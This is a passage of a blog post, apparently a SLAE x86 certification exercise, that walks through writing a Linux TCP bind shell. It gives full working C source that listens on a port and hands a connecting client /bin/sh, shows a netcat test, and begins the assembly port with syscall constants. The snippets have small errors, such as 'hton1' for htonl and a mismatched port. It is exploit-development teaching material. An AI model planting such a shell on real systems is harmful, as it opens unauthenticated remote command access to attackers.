---
title:  "SLAE x86 Assignment 1: TCP Bind Shell"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome to my first SLAE x86 Assignments post! This series of posts aims to fulfil the requirements of the SLAE x86 certification from Pentester Academy, while also making shellcoding easier to understand for people just starting out in the field of exploit development. Let's begin with assignment 1!

## Understanding the objective ##
In order to effectively understand what the shellcode must do, it is a good idea to start off by breaking down the code's major working parts. The shellcode must do the following:

- Creates and configures a socket
- Binds an IP and port to that socket
- Listens for a connection and accepts it
- Duplicates standard file descriptors, so that the shell can interact with the socket
- Spawns a shell

Now that we have an outline for our TCP bind shell, let's write a little C code that does this for us, in order to get a better understanding of how socket functions work.

```c
// SLAE Assignment 1: Shell Bind TCP (Linux/x86)
// Author:  4p0cryph0n
// Website:  https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337); //Port no.
    addr.sin_addr.s_addr = htonl(INADDR_ANY); //Use any interface to listen

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Bind Socket
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Listen
    listen(sockfd, 0);

    //Accept
    int stdfd = accept(sockfd, NULL, NULL);

    //Duplicate Standard File Descriptors
    for (int i = 0; i <= 2; i++)
    {
        dup2(stdfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;  
}
```

#### Defining the Address Structure
```c
//Defining Address Structure
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(1337); //Port no.
addr.sin_addr.s_addr = hton1(INADDR_ANY); //Use any interface to listen
```
This part of the code is responsible for defining the address family, port, and interface parameters, based on which we create our socket. Executing `man 7 ip` gives us a better understanding of the IP Address format:

```
Address format
       An IP socket address is defined as a combination of an IP interface  address  and  a
       16-bit  port  number.   The basic IP protocol does not supply port numbers, they are
       implemented by higher level protocols  like  udp(7)  and  tcp(7).   On  raw  sockets
       sin_port is set to the IP protocol.
```

```c
struct sockaddr_in {
   sa_family_t    sin_family; /* address family: AF_INET */
   in_port_t      sin_port;   /* port in network byte order */
   struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
};
```
Also note that we use ```htons``` and ```hton1``` functions to convert the address and port to Big Endian (network byte order).
```INADDR_ANY``` basically means that the socket will use all the interfaces available on the computer, basically takes the value of ```NULL```.

#### Creating and Configuring the socket
```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```
The ```socket()``` function takes three arguments, shown by the manpage exerpt below. These parameters will be stored in the ```sockfd``` variable for later use in binding, listening and accepting:

```c
#include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);
```
- ```int domain```: This variable is used to specify a protocol family which will be used for communication. In our case, we will be using IPv4 which is specified by ```AF_INET```.
- ```int type```: The type of socket. ```SOCK_STREAM``` in our case, which is used for two-way communication for TCP sockets.
- ```int protocol```: Protocol to be used with the socket. We can also use 0 in our case.

#### Binding the Socket
```c
//Bind Socket
bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
```
This is where we assign an IP and port to the socket, using the ```sockfd``` variable from before, along with the address structure and the size of the address structure, which is supposed to be 16 bytes.

#### Listening and Accepting
```c
//Listen
listen(sockfd, 0);

//Accept
int stdfd = accept(sockfd, NULL, NULL);
```
The ```listen()``` function takes two arguments:
- ```int sockfd```: The socket descriptor from before.
- ```int backlog```: Used to specify the queueing of connections. In our case, we set ```backlog``` to 0, as there is only one connection that we need to be concerned with.

The ```accept()``` function takes three arguments:
- ```int sockfd```: The socket descriptor from before.
- ```struct sockaddr *addr```: The IP of the host. ```NULL``` in our case, as we don't need setup anything for the peer socket.
- ```struct sockaddr *addr```: The addr length of the peer socket. Again, ```NULL```.

After this, the program starts listening for any incoming connections. After it receives one, the ```accept()``` will return a file descriptor for the accepted socket. This is what we will use in order to duplicate the standard file descriptors.

#### Duplicating Standard File Descriptors
```c
//Duplicate Standard File Descriptors
for (int i = 0; i < 3; i++)
{
    dup2(stdfd, i);
}
```
We need to duplicate stdin, stdout and stderr to the socket in order to redirect input and output from the connection to the socket.

#### Executing a shell
```c
//Execute Shell
execve("/bin/sh", NULL, NULL);
return 0;
```
To execute a shell, we use ```execve```, and the ```/bin/sh``` binary. Let's run this!
```
Terminal 1:
$ gcc shell.c -o shell
$ ./shell

Terminal 2:
$ nc -nv 127.0.0.1 31337
(UNKNOWN) [127.0.0.1] 31337 (?) open
pwd
/home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass1
```
Now  that we know the structure of our program, let's start writing the assembly version!

## Assembly Time! ##
Let's start off by gathering our syscall numbers. These are stored in ```/usr/include/linux/net.h```. The ones that we need are:
```
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
```
Now, we will need to find the identifiers for the ```sockfd``` arguments:
- ```AF_INET```: Found in ```/usr/include/bits/socket.h```:
```
#define PF_INET         2       /* IP protocol family.  */
#define AF_INET         PF_INET
```
- ```SOCK_STREAM```: Found in ```/usr/include/bits/socket_type.h```:
```
SOCK_STREAM = 1, /* Sequenced, reliable, connection-based byte streams.  */
```
- ```int protocol```: Found in ```/usr/include/linux/in.h```:
```
IPPROTO_IP = 0, /* Dummy protocol for TCP */
```
Perfect. Let's begin writing the code.
